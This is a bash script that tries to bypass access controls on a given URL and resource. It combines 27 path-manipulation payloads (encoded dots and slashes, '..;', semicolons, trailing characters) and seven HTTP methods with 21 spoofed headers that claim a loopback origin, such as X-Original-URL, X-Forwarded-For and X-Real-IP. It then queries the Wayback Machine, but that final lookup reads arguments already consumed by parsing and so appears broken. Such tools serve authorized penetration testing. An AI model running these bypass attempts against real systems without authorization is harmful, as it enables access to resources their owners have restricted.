#!/bin/bash

# Function to display help
function show_help() {
    echo "Usage: $(basename $0) [OPTIONS]"
    echo
    echo "This script tests various HTTP methods against a given URL and resource to check for potential bypass techniques."
    echo
    echo "Options:"
    echo "  -h, --help        Show this help message."
    echo "  -v, --version     Show the version of the script."
    echo "  -u, --url URL     Specify the base URL (e.g., http://example.com)."
    echo "  -p, --path PATH   Specify the resource or endpoint (e.g., path/to/resource, without / at the beginning)."
    echo
}

# Function to display version
function show_version() {
    echo "$(basename $0) version 1.0"
}

# Function to parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help)
            show_help
            exit 0
            ;;
        -v|--version)
            show_version
            exit 0
            ;;
        -u|--url)
            if [[ -z "$2" ]]; then
                    echo "Error: Missing argument for -u/--url option."
                    show_help
                    exit 1
            fi
            URL="$2"
            shift 2
            ;;
        -p|--path)
            if [[ -z "$2" ]]; then
                    echo "Error: Missing argument for -p/--path options."
                    show_help
                    exit 1
            fi
            RESOURCE="$2"
            shift 2
            ;;
        *)
            echo "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

# Validate URL and RESOURCE
if [[ -z "$URL" || -z "$RESOURCE" ]]; then
    echo "Error: URL and RESOURCE are required."
    show_help
    exit 1
fi

# color definitions
red="\033[31m"
green='\e[32m'
blue='\e[34m'
cyan='\e[96m'
ltcyan='\e[96m'
yellow='\e[33m'
black='\e[38;5;016m'
end="\033[0m"
termwidth="$(tput cols)"

# Global variable Loop Back IP
L_IP="127.0.0.1"

# Function to apply color to the response code
colorize_code() {
  http_code=$1
  if [[ $http_code =~ ^2 ]]; then
    echo -e "\033[1;32m$http_code\033[0m"  # Brighter Green for 2xx
  elif [[ $http_code =~ ^3 ]]; then
    echo -e "\033[1;33m$http_code\033[0m"  # Brighter Yellow for 3xx
  elif [[ $http_code =~ ^4 ]]; then
    echo -e "\033[1;31m$http_code\033[0m"  # Brighter Red for 4xx
  elif [[ $http_code =~ ^5 ]]; then
    echo -e "\033[1;36m$http_code\033[0m"  # Brighter Cyan for 5xx
  else
    echo -e "\033[1;37m$http_code\033[0m"  # Brighter Default for others
  fi
}

echo "------------------------------------------------------------------------"
echo "|Proceeding with GET, POST, PUT, DELETE, PATCH, TRACE, OPTIONS methods.|"
echo "------------------------------------------------------------------------"
methods_to_test="GET POST PUT DELETE PATCH TRACE OPTIONS"

# Define an array of URL manipulations
urls=(
  "$URL/$RESOURCE"
  "$URL/$RESOURCE/"
  "$URL/%2e/$RESOURCE"
  "$URL/$RESOURCE/."
  "$URL//$RESOURCE//"
  "$URL/./$RESOURCE/./"
  "$URL/$RESOURCE%20"
  "$URL/$RESOURCE/*"
  "$URL/*$RESOURCE/"
  "$URL/%2f$RESOURCE/"
  "$URL/./$RESOURCE/"
  "$URL//$RESOURCE/./"
  "$URL///$RESOURCE///"
  "$URL/;/$RESOURCE/"
  "$URL//;//$RESOURCE/"
  "$URL/$RESOURCE.php"
  "$URL/$RESOURCE.json"
  "$URL/$RESOURCE%09"
  "$URL/$RESOURCE?"
  "$URL/$RESOURCE.html"
  "$URL/$RESOURCE/?anything"
  "$URL/$RESOURCE#"
  "$URL/$RESOURCE..;/"
  "$URL/$RESOURCE;/"
  "$URL/..;$RESOURCE"
  "$URL/..;$RESOURCE/"
  "$URL/$RESOURCE..;"
)

# Define additional headers to test
headers=(
  "X-Original-URL: $RESOURCE"
  "X-Custom-IP-Authorization: $L_IP"
  "X-Forwarded-For: http://$L_IP"
  "X-Forwarded-For: $L_IP:80"
  "Content-Length: 0"
  "X-Host: $L_IP"
  "X-Forwarded-Host: $L_IP"
  "X-ProxyUser-Ip: $L_IP"
  "Client-IP: $L_IP"
  "Host: localhost"
  "Host: $L_IP"
  "X-Originating-IP: $L_IP"
  "X-Forwarded-For: $L_IP"
  "X-Remote-IP: $L_IP"
  "X-Remote-Addr: $L_IP"
  "X-Real-IP: $L_IP"
  "X-Client-IP: $L_IP"
  "Redirect: $L_IP"
  "Referer: $L_IP"
  "X-Forwarded-Port: 80"
  "X-True-IP: $L_IP"
)

# Loop through the defined list of URLs
for url in "${urls[@]}"; do
  echo "Testing URL: $url"

  # First, test all methods for the current URL
  for method in $methods_to_test; do
    response=$(curl -k -s -X $method -o /dev/null -iL -w "%{http_code},%{size_download}" $url)

    # Extract HTTP status code and content size
    http_code=$(echo "$response" | cut -d',' -f1)
    content_size=$(echo "$response" | cut -d',' -f2)
    colored_http_code=$(colorize_code "$http_code")

    echo "Payload: [ curl -k -s -X $method -iL \"$url\" ] --> Status Code: $colored_http_code, Content Size: $content_size"
  done

  # Now, test the same methods for the current URL with different headers
  for header in "${headers[@]}"; do
    for method in $methods_to_test; do
      response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -X $method -H "$header" $url)

      # Extract HTTP status code and content size
      http_code=$(echo "$response" | cut -d',' -f1)
      content_size=$(echo "$response" | cut -d',' -f2)

      colored_http_code=$(colorize_code "$http_code")

      echo "Payload: [ curl -k -s -iL -X $method -H \"$header\" \"$url\" ] --> Status Code: $colored_http_code, Content Size: $content_size"
    done
  done
  echo "------------------------------------------------------------"
done

# Additional testing with 'X-rewrite-url' header
for method in "GET" "POST" "PUT" "PATCH" "DELETE"; do
  response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -X $method -H "X-rewrite-url: $RESOURCE" $URL)
  http_code=$(echo "$response" | cut -d',' -f1)
  content_size=$(echo "$response" | cut -d',' -f2)
  colored_http_code=$(colorize_code "$http_code")
  echo "Payload: [ curl -k -s -iL -X $method -H \"X-rewrite-url: $RESOURCE\" \"$URL\" ] --> Status Code: $colored_http_code, Content Size: $content_size"
done

echo "-------------------------------------------------------------"
echo "Way Back Machine:"
echo "Payload: [ curl -s https://archive.org/wayback/available?url=$1/$2 ]"
curl -s https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'
echo "-------------------------------------------------------------"
